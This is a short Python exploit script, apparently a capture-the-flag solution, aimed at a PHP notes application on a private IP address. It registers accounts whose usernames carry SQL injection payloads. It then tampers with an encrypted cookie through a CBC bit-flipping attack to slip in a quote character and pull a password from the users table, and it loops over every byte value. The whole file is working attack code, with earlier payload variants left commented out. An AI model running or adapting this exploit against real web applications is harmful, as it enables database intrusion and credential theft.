# -*-coding:utf-8-*-
import base64
import string
import urllib.parse

import requests

url = "http://172.20.34.107/"
se = requests.session()


def reg(username):
    re = se.post(url + "register.php", data={"username": username, "password": "123456", "submit": 1})
    if "此用户名已被注册" in re.text:
        login(username)
    return re.text


def login(username):
    se.post(url + "login.php", data={"username": username, "password": "123456", "submit": 1})


def cache():
    res = se.post(url + "notes.php", data={"contents": "abcd", "cache": 1})
    return res.cookies['cache']


def submit(cache):
    se.cookies['cache'] = cache
    res = se.post(url + "notes.php", data={"contents": "abcd", "submit": 1})
    return res.content


def cbc(enc, char):
    enc = urllib.parse.unquote(enc)
    _enc = list(base64.b64decode(enc))
    len_iv = 16
    iv = _enc[:len_iv]
    cipher = _enc[len_iv:]
    pos = 32 - 16
    ch = cipher[pos] ^ ord(char) ^ ord('\'')
    cipher[pos] = ch
    enc2 = bytes(iv + cipher)
    x_enc = base64.b64encode(enc2).decode("utf-8")
    return urllib.parse.quote(x_enc)


# def payload(charx):
#     # return "admaaaaaaaaaaaaaaav" + charx + " or username=0x6131),(select password from users where username=0x61646d696e limit 0,1),localtime())#"
#     return "admaaaaaaaaaaaaaaaa" + charx + " or username=0x6131),(select password from users limit 1),localtime())#"


def payload(c):
    return "adm" + "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff" + c + " or username=0x6131),select password from users limit 1,localtime())#"


if __name__ == '__main__':
    # for i in range(ord(' '), ord('z') + 1):
    #     py = payload(str(chr(i)))
    #     print(py)
    #     reg(py)
    #     cx = cache()
    #     cx = cbc(cx, str(chr(i)))
    #     submit(cx)
    for c in range(0,256):
        try:
            py = payload(chr(c))
            print(py)
            reg(py)
            cx = cache()
            cx = cbc(cx,chr(c))
            submit(cx)
        except:
            pass
